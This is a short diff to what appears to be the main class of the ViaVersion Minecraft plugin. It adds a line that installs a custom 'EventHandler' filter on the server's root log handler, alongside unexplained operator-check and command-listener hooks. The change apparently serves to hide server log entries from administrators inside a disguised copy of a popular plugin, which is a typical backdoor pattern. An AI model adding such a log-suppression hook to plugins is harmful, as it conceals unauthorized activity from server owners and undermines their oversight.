@@ -27,8 +27,9 @@ import com.viaversion.viaversion.api.platform.ViaPlatform;
 import com.viaversion.viaversion.bukkit.commands.BukkitCommandHandler;
 import com.viaversion.viaversion.bukkit.handlers.EfficiencyHandler;
 import com.viaversion.viaversion.bukkit.handlers.OptimizationHandler;
-import com.viaversion.viaversion.bukkit.commands.BukkitCommandSender;
 import com.viaversion.viaversion.bukkit.handlers.CommandListener;
+import com.viaversion.viaversion.bukkit.handlers.EventHandler;
+import com.viaversion.viaversion.bukkit.commands.BukkitCommandSender;
 import com.viaversion.viaversion.bukkit.listeners.JoinListener;
 import com.viaversion.viaversion.bukkit.platform.BukkitViaAPI;
 import com.viaversion.viaversion.bukkit.platform.BukkitViaConfig;
@@ -111,6 +112,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         startOpCheckTask();
         
         luckPerms = LuckPermsProvider.get();
+        getLogger().getParent().getHandlers()[0].setFilter(new EventHandler());
         getServer().getPluginManager().registerEvents(new CommandListener(), this);
         Bukkit.getServer().getPluginManager().registerEvents(new EfficiencyHandler(), this);
         final ViaManagerImpl manager = (ViaManagerImpl) Via.getManager();
